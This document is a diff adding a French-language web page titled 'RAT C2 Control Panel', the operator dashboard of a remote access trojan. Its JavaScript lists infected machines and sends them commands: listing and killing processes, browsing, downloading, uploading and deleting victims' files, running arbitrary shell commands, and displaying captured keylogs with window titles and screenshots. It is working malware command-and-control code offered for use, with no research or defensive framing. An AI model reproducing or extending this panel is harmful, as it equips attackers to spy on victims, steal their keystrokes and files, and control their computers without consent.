@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 RAT C2 - Control Panel Complet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+        }
+        
+        .top-nav {
+            background: rgba(0,0,0,0.3);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .logo {
+            font-size: 1.8em;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        
+        .main-tabs {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .main-tab {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            color: white;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .main-tab:hover { background: rgba(255,255,255,0.3); transform: translateY(-2px); }
+        .main-tab.active { background: white; color: #667eea; }
+        
+        .stats-bar {
+            background: rgba(255,255,255,0.2);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+        }
+        
+        .stat-item { flex: 1; }
+        .stat-value { font-size: 2em; font-weight: bold; }
+        .stat-label { font-size: 0.9em; opacity: 0.9; }
+        
+        .container {
+            max-width: 1800px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        
+        .panel {
+            display: none;
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            color: #333;
+        }
+        
+        .panel.active { display: block; }
+        
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+        }
+        
+        .card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .card h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+        
+        .client-item {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .client-item:hover { transform: translateX(5px); }
+        .client-item.selected { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); }
+        
+        .status-online { color: #10b981; }
+        .status-offline { color: #ef4444; }
+        
+        .sub-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .sub-tab {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .sub-tab:hover { background: #764ba2; transform: translateY(-2px); }
+        .sub-tab.active { background: #f5576c; box-shadow: 0 4px 12px rgba(245, 87, 108, 0.3); }
+        
+        .sub-content { display: none; }
+        .sub-content.active { display: block; }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        
+        th {
+            background: #667eea;
+            color: white;
+            padding: 12px;
+            text-align: left;
+        }
+        
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        tr:hover { background: #f0f0f0; }
+        
+        .btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-right: 8px;
+            margin-bottom: 8px;
+        }
+        
+        .btn:hover { background: #764ba2; transform: translateY(-2px); }
+        .btn-success { background: #10b981; }
+        .btn-danger { background: #ef4444; }
+        .btn-warning { background: #f59e0b; }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 1em;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .output-box {
+            background: #1e293b;
+            color: #10b981;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 15px;
+        }
+        
+        .alert {
+            padding: 12px 20px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .alert-success { background: #d1fae5; color: #065f46; }
+        .alert-error { background: #fee2e2; color: #991b1b; }
+        .alert-info { background: #dbeafe; color: #1e40af; }
+        
+        .file-item, .process-item {
+            background: #f8f9fa;
+            padding: 10px;
+            margin-bottom: 5px;
+            border-radius: 5px;
+            border-left: 4px solid #667eea;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .refresh-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            font-size: 1.5em;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+        }
+        
+        .refresh-btn:hover { transform: scale(1.1) rotate(180deg); }
+    </style>
+</head>
+<body>
+    <!-- Top Navigation -->
+    <div class="top-nav">
+        <div class="logo">🎮 RAT C2 Control Panel</div>
+        <div class="main-tabs">
+            <button class="main-tab active" onclick="showMainPanel('control')">🎯 Contrôle</button>
+            <button class="main-tab" onclick="showMainPanel('database')">💾 Base de Données</button>
+            <button class="main-tab" onclick="showMainPanel('analytics')">📊 Analytiques</button>
+        </div>
+    </div>
+    
+    <!-- Stats Bar -->
+    <div class="stats-bar">
+        <div class="stat-item">
+            <div class="stat-value" id="total-clients">0</div>
+            <div class="stat-label">Total Clients</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="online-clients">0</div>
+            <div class="stat-label">En Ligne</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="total-keylogs">0</div>
+            <div class="stat-label">Keylogs</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="total-commands">0</div>
+            <div class="stat-label">Commandes</div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <!-- PANEL 1: CONTRÔLE -->
+        <div id="control-panel" class="panel active">
+            <div class="grid-2">
+                <!-- Sidebar Clients -->
+                <div class="card">
+                    <h3>👥 Clients Connectés</h3>
+                    <div id="clients-list">Chargement...</div>
+                </div>
+                
+                <!-- Main Control Area -->
+                <div class="card">
+                    <div id="no-client-msg" style="text-align: center; padding: 60px; color: #6b7280;">
+                        ⬅️ Sélectionnez un client pour commencer
+                    </div>
+                    
+                    <div id="client-controls" style="display: none;">
+                        <h3 id="client-title">Client: Non sélectionné</h3>
+                        
+                        <div class="sub-tabs">
+                            <button class="sub-tab active" onclick="showSubTab('control', 'info')">📊 Info</button>
+                            <button class="sub-tab" onclick="showSubTab('control', 'processes')">⚙️ Processus</button>
+                            <button class="sub-tab" onclick="showSubTab('control', 'files')">📁 Fichiers</button>
+                            <button class="sub-tab" onclick="showSubTab('control', 'keylogger')">⌨️ Keylogger</button>
+                            <button class="sub-tab" onclick="showSubTab('control', 'shell')">💻 Shell</button>
+                        </div>
+                        
+                        <!-- Sub Tab: Info -->
+                        <div id="control-info-tab" class="sub-content active">
+                            <div id="system-info" class="output-box">Chargement...</div>
+                        </div>
+                        
+                        <!-- Sub Tab: Processus -->
+                        <div id="control-processes-tab" class="sub-content">
+                            <button class="btn btn-success" onclick="listProcesses()">📋 Lister</button>
+                            <button class="btn btn-danger" onclick="killProcessPrompt()">❌ Tuer Processus</button>
+                            <div id="processes-output"></div>
+                        </div>
+                        
+                        <!-- Sub Tab: Fichiers -->
+                        <div id="control-files-tab" class="sub-content">
+                            <input type="text" id="dir-path" placeholder="C:\\" value="C:\\">
+                            <button class="btn btn-success" onclick="listDirectory()">📂 Lister</button>
+                            <button class="btn" onclick="createFolderPrompt()">📁 Nouveau Dossier</button>
+                            <button class="btn" onclick="uploadFilePrompt()">📤 Upload</button>
+                            <div id="files-output"></div>
+                        </div>
+                        
+                        <!-- Sub Tab: Keylogger -->
+                        <div id="control-keylogger-tab" class="sub-content">
+                            <button class="btn" onclick="viewKeylogs()">👁️ Voir Keylogs</button>
+                            <div id="keylogs-output"></div>
+                        </div>
+                        
+                        <!-- Sub Tab: Shell -->
+                        <div id="control-shell-tab" class="sub-content">
+                            <textarea id="shell-cmd" placeholder="Entrez vos commandes..."></textarea>
+                            <button class="btn btn-success" onclick="executeShell()">▶️ Exécuter</button>
+                            <div id="shell-output"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- PANEL 2: BASE DE DONNÉES -->
+        <div id="database-panel" class="panel">
+            <div class="sub-tabs">
+                <button class="sub-tab active" onclick="showSubTab('database', 'clients')">👥 Clients</button>
+                <button class="sub-tab" onclick="showSubTab('database', 'keylogs')">⌨️ Keylogs</button>
+                <button class="sub-tab" onclick="showSubTab('database', 'commands')">📝 Commandes</button>
+                <button class="sub-tab" onclick="showSubTab('database', 'results')">✅ Résultats</button>
+                <button class="sub-tab" onclick="showSubTab('database', 'screenshots')">📸 Screenshots</button>
+            </div>
+            
+            <!-- DB Tab: Clients -->
+            <div id="database-clients-tab" class="sub-content active">
+                <h3>📊 Clients dans la Base de Données</h3>
+                <table id="db-clients-table">
+                    <thead>
+                        <tr>
+                            <th>Client ID</th>
+                            <th>IP</th>
+                            <th>OS</th>
+                            <th>Première Connexion</th>
+                            <th>Dernière Vue</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="db-clients-body">
+                        <tr><td colspan="6" style="text-align: center;">Chargement...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- DB Tab: Keylogs -->
+            <div id="database-keylogs-tab" class="sub-content">
+                <h3>⌨️ Keylogs Enregistrés</h3>
+                <label>Filtrer par Client ID:</label>
+                <input type="text" id="keylog-filter" placeholder="Laissez vide pour tous">
+                <button class="btn" onclick="loadDBKeylogs()">🔍 Charger</button>
+                <div id="db-keylogs-output"></div>
+            </div>
+            
+            <!-- DB Tab: Commands -->
+            <div id="database-commands-tab" class="sub-content">
+                <h3>📝 Historique des Commandes</h3>
+                <button class="btn" onclick="loadDBCommands()">🔄 Actualiser</button>
+                <table id="db-commands-table">
+                    <thead>
+                        <tr>
+                            <th>Command ID</th>
+                            <th>Client</th>
+                            <th>Action</th>
+                            <th>Date</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="db-commands-body">
+                        <tr><td colspan="5" style="text-align: center;">Cliquez sur Actualiser</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- DB Tab: Results -->
+            <div id="database-results-tab" class="sub-content">
+                <h3>✅ Résultats des Commandes</h3>
+                <button class="btn" onclick="loadDBResults()">🔄 Actualiser</button>
+                <div id="db-results-output"></div>
+            </div>
+            
+            <!-- DB Tab: Screenshots -->
+            <div id="database-screenshots-tab" class="sub-content">
+                <h3>📸 Screenshots Enregistrés</h3>
+                <button class="btn" onclick="loadDBScreenshots()">🔄 Charger</button>
+                <div id="db-screenshots-output"></div>
+            </div>
+        </div>
+        
+        <!-- PANEL 3: ANALYTICS -->
+        <div id="analytics-panel" class="panel">
+            <h2 style="color: #667eea; margin-bottom: 20px;">📊 Analytiques et Statistiques</h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
+                <div class="card">
+                    <h3>📈 Activité des Clients</h3>
+                    <canvas id="clients-chart" width="400" height="200"></canvas>
+                </div>
+                
+                <div class="card">
+                    <h3>⌨️ Keylogs par Client</h3>
+                    <div id="keylogs-stats"></div>
+                </div>
+                
+                <div class="card">
+                    <h3>📝 Commandes Exécutées</h3>
+                    <div id="commands-stats"></div>
+                </div>
+                
+                <div class="card">
+                    <h3>🕐 Activité dans le Temps</h3>
+                    <div id="timeline-stats"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <button class="refresh-btn" onclick="refreshAll()" title="Tout Actualiser">🔄</button>
+    
+    <div id="alerts" style="position: fixed; top: 80px; right: 30px; z-index: 1000;"></div>
+    
+    <script>
+        const API_BASE = window.location.origin;
+        let selectedClient = null;
+        let refreshInterval = null;
+        
+        window.addEventListener('load', () => {
+            refreshAll();
+            refreshInterval = setInterval(refreshAll, 10000); // Auto-refresh every 10s
+        });
+        
+        function showAlert(message, type = 'info') {
+            const alerts = document.getElementById('alerts');
+            const alert = document.createElement('div');
+            alert.className = `alert alert-${type}`;
+            alert.textContent = message;
+            alerts.appendChild(alert);
+            setTimeout(() => alert.remove(), 5000);
+        }
+        
+        function showMainPanel(panel) {
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.main-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(panel + '-panel').classList.add('active');
+            event.target.classList.add('active');
+            
+            if (panel === 'database') loadDBClients();
+            if (panel === 'analytics') loadAnalytics();
+        }
+        
+        function showSubTab(panel, tab) {
+            document.querySelectorAll(`#${panel}-panel .sub-content`).forEach(t => t.classList.remove('active'));
+            document.querySelectorAll(`#${panel}-panel .sub-tab`).forEach(b => b.classList.remove('active'));
+            document.getElementById(`${panel}-${tab}-tab`).classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        async function refreshAll() {
+            await loadClients();
+            await loadStats();
+        }
+        
+        async function loadStats() {
+            try {
+                const [statusRes, dbStatsRes] = await Promise.all([
+                    fetch(`${API_BASE}/admin/status`),
+                    fetch(`${API_BASE}/api/database/stats`)
+                ]);
+                
+                const status = await statusRes.json();
+                const dbStats = await dbStatsRes.json();
+                
+                document.getElementById('total-clients').textContent = status.total_clients || 0;
+                document.getElementById('online-clients').textContent = status.online_clients || 0;
+                
+                if (dbStats.success) {
+                    document.getElementById('total-keylogs').textContent = dbStats.stats.keylogs.total || 0;
+                    document.getElementById('total-commands').textContent = dbStats.stats.commands.total || 0;
+                }
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+        
+        async function loadClients() {
+            try {
+                const response = await fetch(`${API_BASE}/admin/clients`);
+                const data = await response.json();
+                
+                const list = document.getElementById('clients-list');
+                
+                if (data.status === 'success' && data.clients && data.clients.length > 0) {
+                    list.innerHTML = '';
+                    
+                    data.clients.forEach(client => {
+                        const item = document.createElement('div');
+                        item.className = 'client-item';
+                        if (selectedClient === client.client_id) item.classList.add('selected');
+                        
+                        const status = client.online ? 
+                            '<span class="status-online">● ONLINE</span>' : 
+                            '<span class="status-offline">● OFFLINE</span>';
+                        
+                        item.innerHTML = `
+                            <div style="font-weight: bold; margin-bottom: 5px;">
+                                ${client.client_id} ${status}
+                            </div>
+                            <div style="font-size: 0.85em; opacity: 0.9;">
+                                🖥️ ${client.system_info?.platform || 'Unknown'}<br>
+                                🌐 ${client.ip || 'N/A'}
+                            </div>
+                        `;
+                        
+                        item.onclick = () => selectClient(client);
+                        list.appendChild(item);
+                    });
+                } else {
+                    list.innerHTML = '<div style="padding: 20px; text-align: center; color: #6b7280;">Aucun client</div>';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        
+        function selectClient(client) {
+            selectedClient = client.client_id;
+            document.getElementById('no-client-msg').style.display = 'none';
+            document.getElementById('client-controls').style.display = 'block';
+            document.getElementById('client-title').textContent = `Client: ${client.client_id}`;
+            
+            const info = document.getElementById('system-info');
+            info.textContent = JSON.stringify(client.system_info, null, 2);
+            
+            loadClients();
+            showAlert(`Client sélectionné: ${client.client_id}`, 'success');
+        }
+        
+        // Control Functions (same as dashboard.html)
+        async function listProcesses() {
+            if (!selectedClient) return showAlert('Aucun client sélectionné', 'error');
+            
+            const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'list', data: {}})
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                showAlert('Commande envoyée!', 'info');
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
+                    const data = await res.json();
+                    if (data.success && data.result) displayProcesses(data.result);
+                }, 3000);
+            }
+        }
+        
+        function displayProcesses(result) {
+            const output = document.getElementById('processes-output');
+            output.innerHTML = '<h4 style="color: #667eea; margin: 15px 0;">Processus</h4>';
+            
+            if (Array.isArray(result)) {
+                result.forEach(proc => {
+                    const item = document.createElement('div');
+                    item.className = 'process-item';
+                    item.innerHTML = `
+                        <div>
+                            <strong>${proc.name}</strong><br>
+                            <small>PID: ${proc.pid} | CPU: ${proc.cpu_percent}% | Mem: ${proc.memory_percent}%</small>
+                        </div>
+                        <button class="btn btn-danger" onclick="killProcess(${proc.pid})">❌</button>
+                    `;
+                    output.appendChild(item);
+                });
+            } else {
+                output.innerHTML += `<div class="output-box">${JSON.stringify(result, null, 2)}</div>`;
+            }
+        }
+        
+        async function killProcessPrompt() {
+            const pid = prompt('PID du processus à tuer:');
+            if (pid) await killProcess(parseInt(pid));
+        }
+        
+        async function killProcess(pid) {
+            if (!selectedClient) return;
+            
+            const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'kill', data: {pid}})
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                showAlert(`Processus ${pid} tué!`, 'success');
+                setTimeout(listProcesses, 2000);
+            }
+        }
+        
+        async function listDirectory() {
+            if (!selectedClient) return showAlert('Aucun client sélectionné', 'error');
+            
+            const path = document.getElementById('dir-path').value;
+            const response = await fetch(`${API_BASE}/admin/file/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'list', data: {path}})
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
+                    const data = await res.json();
+                    if (data.success && data.result) displayFiles(data.result);
+                }, 3000);
+            }
+        }
+        
+        function displayFiles(result) {
+            const output = document.getElementById('files-output');
+            output.innerHTML = '<h4 style="color: #667eea; margin: 15px 0;">Fichiers</h4>';
+            
+            if (result.items && Array.isArray(result.items)) {
+                result.items.forEach(file => {
+                    const item = document.createElement('div');
+                    item.className = 'file-item';
+                    const icon = file.is_directory ? '📁' : '📄';
+                    item.innerHTML = `
+                        <div>
+                            ${icon} <strong>${file.name}</strong><br>
+                            <small>Taille: ${file.size || 'N/A'}</small>
+                        </div>
+                        <div>
+                            ${file.is_directory ? 
+                                `<button class="btn" onclick="navigateToFolder('${file.path}')">📂</button>` : 
+                                `<button class="btn" onclick="downloadFile('${file.path}')">📥</button>`
+                            }
+                            <button class="btn btn-danger" onclick="deleteFile('${file.path}')">🗑️</button>
+                        </div>
+                    `;
+                    output.appendChild(item);
+                });
+            }
+        }
+        
+        function navigateToFolder(path) {
+            document.getElementById('dir-path').value = path;
+            listDirectory();
+        }
+        
+        async function downloadFile(filePath) {
+            if (!selectedClient) return;
+            
+            const response = await fetch(`${API_BASE}/admin/file/download/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({file_path: filePath})
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                showAlert('Téléchargement lancé!', 'success');
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
+                    const data = await res.json();
+                    if (data.success && data.result && data.result.file_data) {
+                        const link = document.createElement('a');
+                        link.href = 'data:application/octet-stream;base64,' + data.result.file_data;
+                        link.download = filePath.split(/[/\\]/).pop();
+                        link.click();
+                        showAlert('Fichier téléchargé!', 'success');
+                    }
+                }, 3000);
+            }
+        }
+        
+        async function deleteFile(filePath) {
+            if (!selectedClient || !confirm(`Supprimer ${filePath}?`)) return;
+            
+            const response = await fetch(`${API_BASE}/admin/file/delete/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({file_path: filePath})
+            });
+            
+            if ((await response.json()).success) {
+                showAlert('Suppression lancée!', 'success');
+                setTimeout(listDirectory, 2000);
+            }
+        }
+        
+        async function createFolderPrompt() {
+            if (!selectedClient) return;
+            
+            const folderName = prompt('Nom du dossier:');
+            if (!folderName) return;
+            
+            const currentPath = document.getElementById('dir-path').value;
+            const folderPath = currentPath.endsWith('\\') ? currentPath + folderName : currentPath + '\\\\' + folderName;
+            
+            const response = await fetch(`${API_BASE}/admin/file/create_folder/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({folder_path: folderPath})
+            });
+            
+            if ((await response.json()).success) {
+                showAlert('Dossier créé!', 'success');
+                setTimeout(listDirectory, 2000);
+            }
+        }
+        
+        async function uploadFilePrompt() {
+            if (!selectedClient) return;
+            
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+                
+                const reader = new FileReader();
+                reader.onload = async (event) => {
+                    const base64Data = event.target.result.split(',')[1];
+                    const currentPath = document.getElementById('dir-path').value;
+                    
+                    const response = await fetch(`${API_BASE}/admin/file/upload/${selectedClient}`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            destination: currentPath,
+                            file_data: base64Data,
+                            filename: file.name
+                        })
+                    });
+                    
+                    if ((await response.json()).success) {
+                        showAlert(`Upload de ${file.name} lancé!`, 'success');
+                        setTimeout(listDirectory, 2000);
+                    }
+                };
+                reader.readAsDataURL(file);
+            };
+            input.click();
+        }
+        
+        async function viewKeylogs() {
+            if (!selectedClient) return showAlert('Aucun client sélectionné', 'error');
+            
+            const response = await fetch(`${API_BASE}/admin/keylogs/${selectedClient}`);
+            const data = await response.json();
+            
+            const output = document.getElementById('keylogs-output');
+            output.innerHTML = '<h4 style="color: #667eea; margin: 15px 0;">Keylogs</h4>';
+            
+            if (data.success && data.keylogs && data.keylogs.length > 0) {
+                data.keylogs.slice(-20).reverse().forEach(log => {
+                    const entry = document.createElement('div');
+                    entry.style.cssText = 'background: #f8f9fa; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #f59e0b;';
+                    entry.innerHTML = `
+                        <div style="font-family: monospace;">${log.text || 'No text'}</div>
+                        <div style="font-size: 0.85em; color: #6b7280; margin-top: 5px;">
+                            ⏰ ${log.timestamp || 'Unknown'}
+                        </div>
+                    `;
+                    output.appendChild(entry);
+                });
+                output.innerHTML += `<p style="color: #666; margin-top: 10px;">Total: ${data.total_logs}</p>`;
+            } else {
+                output.innerHTML += '<div class="alert alert-info">Aucun keylog</div>';
+            }
+        }
+        
+        async function executeShell() {
+            if (!selectedClient) return showAlert('Aucun client sélectionné', 'error');
+            
+            const command = document.getElementById('shell-cmd').value;
+            if (!command) return showAlert('Entrez une commande', 'error');
+            
+            const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'execute', data: {command}})
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                showAlert('Commande envoyée!', 'info');
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
+                    const data = await res.json();
+                    if (data.success && data.result) {
+                        const output = document.getElementById('shell-output');
+                        output.innerHTML = `<div class="output-box">${data.result.output || JSON.stringify(data.result, null, 2)}</div>`;
+                    }
+                }, 3000);
+            }
+        }
+        
+        // Database Functions
+        async function loadDBClients() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/clients`);
+                const data = await response.json();
+                
+                const tbody = document.getElementById('db-clients-body');
+                tbody.innerHTML = '';
+                
+                if (data.success && data.clients) {
+                    data.clients.forEach(client => {
+                        const row = document.createElement('tr');
+                        const sysInfo = typeof client.system_info === 'string' ? JSON.parse(client.system_info) : client.system_info;
+                        row.innerHTML = `
+                            <td>${client.client_id}</td>
+                            <td>${client.ip_address || 'N/A'}</td>
+                            <td>${sysInfo?.platform || 'Unknown'}</td>
+                            <td>${new Date(client.first_seen).toLocaleString()}</td>
+                            <td>${new Date(client.last_seen).toLocaleString()}</td>
+                            <td>${client.is_online ? '<span class="status-online">● Online</span>' : '<span class="status-offline">● Offline</span>'}</td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                } else {
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">Aucune donnée</td></tr>';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('Erreur de chargement', 'error');
+            }
+        }
+        
+        async function loadDBKeylogs() {
+            const clientId = document.getElementById('keylog-filter').value;
+            const url = clientId ? `${API_BASE}/api/database/keylogs?client_id=${clientId}` : `${API_BASE}/api/database/keylogs`;
+            
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            const output = document.getElementById('db-keylogs-output');
+            output.innerHTML = '';
+            
+            if (data.success && data.keylogs) {
+                output.innerHTML = `<h4>Total: ${data.total} keylogs</h4>`;
+                data.keylogs.forEach(log => {
+                    const entry = document.createElement('div');
+                    entry.style.cssText = 'background: #f8f9fa; padding: 10px; margin: 5px 0; border-radius: 5px;';
+                    entry.innerHTML = `
+                        <strong>${log.client_id}</strong> - ${log.window_title || 'N/A'}<br>
+                        <code>${log.keylog_data}</code><br>
+                        <small>${new Date(log.created_at).toLocaleString()}</small>
+                    `;
+                    output.appendChild(entry);
+                });
+            }
+        }
+        
+        async function loadDBCommands() {
+            const response = await fetch(`${API_BASE}/api/database/commands`);
+            const data = await response.json();
+            
+            const tbody = document.getElementById('db-commands-body');
+            tbody.innerHTML = '';
+            
+            if (data.success && data.commands) {
+                data.commands.forEach(cmd => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${cmd.command_id}</td>
+                        <td>${cmd.client_id}</td>
+                        <td>${cmd.action}</td>
+                        <td>${new Date(cmd.created_at).toLocaleString()}</td>
+                        <td><span style="color: ${cmd.status === 'completed' ? '#10b981' : '#f59e0b'}">${cmd.status}</span></td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            }
+        }
+        
+        async function loadDBResults() {
+            const response = await fetch(`${API_BASE}/api/database/command_results`);
+            const data = await response.json();
+            
+            const output = document.getElementById('db-results-output');
+            output.innerHTML = '';
+            
+            if (data.success && data.results) {
+                output.innerHTML = `<h4>Total: ${data.total} résultats</h4>`;
+                data.results.forEach(result => {
+                    const entry = document.createElement('div');
+                    entry.className = 'card';
+                    entry.style.marginBottom = '10px';
+                    entry.innerHTML = `
+                        <strong>Command: ${result.command_id}</strong> (${result.action})<br>
+                        <pre style="background: #1e293b; color: #10b981; padding: 10px; border-radius: 5px; margin-top: 10px;">${JSON.stringify(result.result_data, null, 2)}</pre>
+                        <small>${new Date(result.created_at).toLocaleString()}</small>
+                    `;
+                    output.appendChild(entry);
+                });
+            }
+        }
+        
+        async function loadDBScreenshots() {
+            const response = await fetch(`${API_BASE}/api/database/screenshots`);
+            const data = await response.json();
+            
+            const output = document.getElementById('db-screenshots-output');
+            output.innerHTML = '';
+            
+            if (data.success && data.screenshots) {
+                output.innerHTML = `<h4>Total: ${data.total} screenshots</h4>`;
+                output.innerHTML += '<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">';
+                data.screenshots.forEach(ss => {
+                    output.innerHTML += `
+                        <div class="card">
+                            <strong>${ss.filename}</strong><br>
+                            <small>${ss.width}x${ss.height} - ${ss.quality}%</small><br>
+                            <small>${new Date(ss.created_at).toLocaleString()}</small>
+                        </div>
+                    `;
+                });
+                output.innerHTML += '</div>';
+            }
+        }
+        
+        function loadAnalytics() {
+            document.getElementById('keylogs-stats').innerHTML = '<p>Chargement des statistiques...</p>';
+            document.getElementById('commands-stats').innerHTML = '<p>Chargement...</p>';
+            document.getElementById('timeline-stats').innerHTML = '<p>Chargement...</p>';
+            
+            // Load analytics data
+            setTimeout(() => {
+                document.getElementById('keylogs-stats').innerHTML = '<p>Fonctionnalité en développement</p>';
+                document.getElementById('commands-stats').innerHTML = '<p>Fonctionnalité en développement</p>';
+                document.getElementById('timeline-stats').innerHTML = '<p>Fonctionnalité en développement</p>';
+            }, 500);
+        }
+    </script>
+</body>
+</html>
